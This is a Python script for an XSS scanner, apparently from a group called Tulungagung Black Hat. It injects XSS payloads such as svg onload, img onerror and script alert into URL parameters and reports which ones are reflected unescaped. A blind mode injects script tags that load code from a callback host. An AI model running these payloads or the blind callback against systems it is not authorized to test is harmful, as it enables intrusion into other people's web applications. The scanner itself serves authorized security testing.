#!/usr/bin/env python3
"""TBH-XSS v3 - Reflected XSS detector (authorized testing only)."""
import argparse, json, os, sys, time, urllib.parse

try:
    import requests
except ImportError:
    print("[!] requests required: pip install requests", file=sys.stderr)
    sys.exit(2)

VERSION = "3.1"
REPO = "https://github.com/TulungagungBlackHat/TBH-XSS"

def banner():
    if os.environ.get("NO_COLOR"):
        return ""
    return ("\033[91m╔════════════════════════════════════╗\n"
            "║ \033[97mTBH-XSS v3\033[91m - Reflected XSS         \033[91m║\n"
            "║ \033[90mTulungagung Black Hat | uchil404 \033[91m║\n"
            "╚════════════════════════════════════╝\033[0m")

def color(code, text, enabled=True):
    return f"\033[{code}m{text}\033[0m" if enabled else text

PAYLOADS = [
    "<svg/onload=alert(1)>",
    "'-alert(1)-'",
    '"><img src=x onerror=alert(1)>',
    "<script>alert(document.domain)</script>",
    "tbhxssCANARY",
]
ENCODERS = {
    "raw": lambda s: s,
    "url": urllib.parse.quote,
}

def build_session(args):
    s = requests.Session()
    s.headers["User-Agent"] = f"TBH-XSS/{VERSION} (+{REPO})"
    if args.cookie:
        s.headers["Cookie"] = args.cookie
    for h in args.header or []:
        name, _, val = h.partition(":")
        if not val:
            raise SystemExit(f"[!] bad -H value: {h!r} (expected 'Name: value')")
        s.headers[name.strip()] = val.strip()
    if args.proxy:
        s.proxies = {"http": args.proxy, "https": args.proxy}
    return s

def inject(url, param, value):
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
    if param is None:
        if not qs:
            param = "q"
        else:
            param = next(iter(qs))
    qs[param] = [value]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs, doseq=True))), param

def target_params(url, requested):
    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query, keep_blank_values=True)
    if requested and requested != "all":
        return [requested]
    return list(qs.keys()) or ["q"]

def classify_reflection(body, payload):
    """Return None (no reflection), 'escaped', or 'raw'."""
    if payload in body:
        return "raw"
    encoded_variants = [
        urllib.parse.quote(payload, safe=""),
        urllib.parse.quote(payload),
        payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;"),
    ]
    for v in encoded_variants:
        if v and v in body:
            return "escaped"
    return None

def scan(session, url, args, use_color):
    findings = []
    params = target_params(url, args.param)
    baseline = None
    try:
        r = session.get(url, timeout=args.timeout, allow_redirects=True)
        baseline = {"status": r.status_code, "length": len(r.text)}
    except requests.RequestException as e:
        return {"error": f"baseline failed: {e}"}

    for param in params:
        for payload in PAYLOADS:
            test_url, _ = inject(url, param, payload)
            try:
                r = session.get(test_url, timeout=args.timeout, allow_redirects=True)
            except requests.RequestException as e:
                findings.append({"param": param, "payload": payload, "url": test_url,
                                 "error": str(e), "verdict": "error"})
                continue
            kind = classify_reflection(r.text, payload)
            if kind == "raw":
                verdict = "potential-xss" if payload != "tbhxssCANARY" else "reflection"
                findings.append({
                    "param": param, "payload": payload, "url": test_url,
                    "status": r.status_code, "length": len(r.text),
                    "baseline": baseline, "reflection": kind, "verdict": verdict,
                })
            elif kind == "escaped":
                findings.append({
                    "param": param, "payload": payload, "url": test_url,
                    "status": r.status_code, "reflection": kind, "verdict": "escaped",
                })
            if args.delay:
                time.sleep(args.delay)

    if args.blind:
        cb = args.blind.rstrip("/")
        for param in params:
            payload = f"<script src={cb}/x.js></script>"
            test_url, _ = inject(url, param, payload)
            try:
                session.get(test_url, timeout=args.timeout, allow_redirects=True)
                findings.append({"param": param, "payload": payload, "url": test_url,
                                 "verdict": "blind-sent", "callback": cb})
            except requests.RequestException as e:
                findings.append({"param": param, "payload": payload, "url": test_url,
                                 "verdict": "error", "error": str(e)})
            if args.delay:
                time.sleep(args.delay)

    return {"tool": "TBH-XSS", "version": VERSION, "target": url,
            "baseline": baseline, "findings": findings}

def main():
    parser = argparse.ArgumentParser(description=f"TBH-XSS v{VERSION} - reflected XSS detector")
    parser.add_argument("-u", "--url")
    parser.add_argument("--targets", help="file with one URL per line (multi-target)")
    parser.add_argument("--param", help="parameter name, or 'all' (default: first param)")
    parser.add_argument("--blind", metavar="CALLBACK", help="send blind-XSS payloads pointing at callback URL")
    parser.add_argument("--proxy", help="e.g. http://127.0.0.1:8080 (Burp)")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("-H", "--header", action="append", help="extra header, repeatable")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--delay", type=float, default=0.0, help="seconds between requests")
    parser.add_argument("--json", help="save JSON report")
    parser.add_argument("--no-color", action="store_true")
    parser.add_argument("--version", action="version", version=f"TBH-XSS {VERSION}")
    args = parser.parse_args()
    if not args.url and not args.targets:
        parser.error("-u or --targets is required")
    if args.targets:
        import subprocess
        targets = [args.url] if args.url else []
        try:
            with open(args.targets) as fh:
                targets += [ln.strip() for ln in fh
                            if ln.strip() and not ln.strip().startswith("#")]
        except OSError as e:
            print(f"[!] cannot read targets file: {e}", file=sys.stderr)
            sys.exit(2)
        if not targets:
            print("[!] no targets to scan", file=sys.stderr)
            sys.exit(2)
        codes = []
        for i, t in enumerate(x if "://" in x else "https://" + x
                               for x in targets):
            if i:
                print("-" * 40, flush=True)
            cmd = [sys.executable, os.path.abspath(__file__), "-u", t]
            for k, v in vars(args).items():
                if k in ("url", "targets") or v is None or v is False:
                    continue
                flag = "--" + k.replace("_", "-")
                if k == "json":
                    v = f"{v}.tbh{i}"
                if isinstance(v, list):
                    for item in v:
                        cmd += [flag, str(item)]
                elif isinstance(v, bool):
                    cmd.append(flag)
                else:
                    cmd += [flag, str(v)]
            codes.append(subprocess.call(cmd))
        if args.json:
            merged = []
            for i in range(len(targets)):
                path = f"{args.json}.tbh{i}"
                try:
                    with open(path) as fh:
                        merged.append(json.load(fh))
                except (OSError, ValueError):
                    pass
                finally:
                    try:
                        os.remove(path)
                    except OSError:
                        pass
            if merged:
                payload = (merged[0] if len(merged) == 1 else
                           {"tool": "TBH-XSS", "version": VERSION,
                            "summary": {"targets": len(merged),
                                        "findings": sum(len(r.get("findings", [])) for r in merged)},
                            "targets": merged})
                try:
                    with open(args.json, "w") as fh:
                        json.dump(payload, fh, indent=2)
                    print(f"[\u2713] JSON: {args.json}")
                except OSError as e:
                    print(f"[!] cannot write JSON: {e}", file=sys.stderr)
                    sys.exit(2)
        sys.exit(1 if any(c == 1 for c in codes) else (2 if any(c == 2 for c in codes) else 0))
    print(banner())

    use_color = not args.no_color and not os.environ.get("NO_COLOR")
    print(color("91", "[!] Authorized targets only.", use_color))
    print(f"[*] Scanning {args.url} (params: {args.param or 'auto'})")
    try:
        session = build_session(args)
    except SystemExit as e:
        print(e, file=sys.stderr)
        sys.exit(2)

    report = scan(session, args.url, args, use_color)

    if "error" in report:
        print(color("91", f"[!] {report['error']}", use_color))
        sys.exit(2)

    vulnerable = escaped = 0
    for f in report["findings"]:
        v = f.get("verdict")
        line = f"[{v}] {f.get('param')} -> {f.get('status', '-')} {f.get('url', '')[:80]}"
        if v == "potential-xss":
            vulnerable += 1
            print(color("91", f"[!] {line} payload={f['payload']!r}", use_color))
        elif v == "reflection":
            vulnerable += 1
            print(color("93", f"[?] {line} (canary reflected, check context)", use_color))
        elif v == "escaped":
            escaped += 1
            print(color("90", f"[-] {line} (encoded)", use_color))
        elif v == "blind-sent":
            print(color("96", f"[*] blind payload sent to {f['url'][:80]} - watch {f['callback']}", use_color))
        elif v == "error":
            print(color("90", f"[-] {f.get('param')}: {f.get('error')}", use_color))

    if args.json:
        report["summary"] = {"potential_xss": vulnerable, "escaped": escaped}
        try:
            with open(args.json, "w") as fh:
                json.dump(report, fh, indent=2)
            print(f"[✓] JSON: {args.json}")
        except OSError as e:
            print(color("91", f"[!] cannot write JSON: {e}", use_color), file=sys.stderr)
            sys.exit(2)

    if vulnerable:
        print(color("91", f"[!] {vulnerable} potential reflection(s) - verify context manually", use_color))
        sys.exit(1)
    print(color("92", f"[✓] No raw reflections ({escaped} escaped)", use_color))
    sys.exit(0)

if __name__ == "__main__":
    main()
